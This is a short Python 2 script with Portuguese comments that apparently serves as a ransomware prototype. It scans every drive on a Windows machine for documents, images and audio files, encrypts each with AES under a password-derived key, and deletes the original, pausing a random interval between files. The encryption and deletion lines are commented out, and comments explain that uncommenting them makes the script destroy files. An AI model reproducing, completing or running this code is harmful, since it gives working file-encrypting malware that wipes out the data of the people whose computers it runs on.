import os, random, struct, hashlib, time, win32api
from Crypto.Cipher import AES

extensions = ['.mp3','.txt','.docx','.doc','.xlsx','.png','.jpg','jpeg']

def pega_arquivos(key):
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        for root, dirs, files in os.walk(drive):
            for file in files:
                if file.endswith(tuple(extensions)):
                    in_filename = (os.path.join(root, file))
                    print "[+] - Arquivo Localizado = [+]"
                    print in_filename
    
                    #Encripta Arquivo
                    print "[!] - Encriptando Arquivo..."
                    #Se voce descomentar essa linha abaixo ele vai criar os arquivos encriptados
                    #encripta_arquivos(key,in_filename)
                    print "[+] - Arquivo Encriptando."
    
                    #Exclui arquivo original
                    print "[!] - Excluindo Arquivo Original..."
                    #Se voce descomentar essa linha abaixo ele vai apagar os arquivos originais
                    #os.remove(os.path.join(root, file))
                    print "[+] - Arquivo Original Excluido."
    
                    #Gera tempo para encriptar o proximo Arquivo
                    tempo_ale = random.randint(1, 10)
                    print "[+] - Proxima Execucao em %s Segundos" %tempo_ale
                    time.sleep(tempo_ale)
                    print
    print "[+] - Execucao finalizada"

def encripta_arquivos(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'
    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def chave_enc():
    password = raw_input('[!] - Digite a senha de encriptacao: ')
    key = hashlib.sha256(password).digest()
    pega_arquivos(key)
def main():
    chave_enc()

main()
